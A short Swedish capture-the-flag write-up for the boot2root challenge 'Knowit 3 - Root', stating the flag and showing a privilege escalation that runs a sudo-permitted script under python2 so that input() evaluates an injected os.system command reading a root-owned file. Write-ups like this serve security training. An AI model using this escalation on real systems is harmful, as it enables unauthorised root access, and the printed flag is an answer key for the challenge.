# Boot2root: Knowit 3 - Root

- **Skapare:** Knowit (Fredrik Ljung)
- **Poäng:** 400
- **Antal lösningar:** ???

## Beskrivning

Kan du eskalera dina rättigheter och få full kontroll över maskinen?

## Flagga

`SSM{Knowit_3_wHat_cOuLD_tH1S_b3_59.3315166_18.0588392}`

## Lösning

I david's hemmapp så finns ett skript test.py. Kör man kommandot sudo -l så ser man att man kan köra python2/3 på test.py som sudo. 

Skriptet är tänkt att köra med python3, men man har SUDO rättigheter att köra skriptet även med python2.
Eftersom skriptet använder sig av `input()` som är samma sak som `eval(raw_input(prompt))` i python2 kan man då exempelvis köra:

`sudo -u root2 /usr/bin/python2 /home/david/test.py`

och sen:

`__import__("os").system("cat /root2/flag.txt")`

För att läsa ut flaggan.

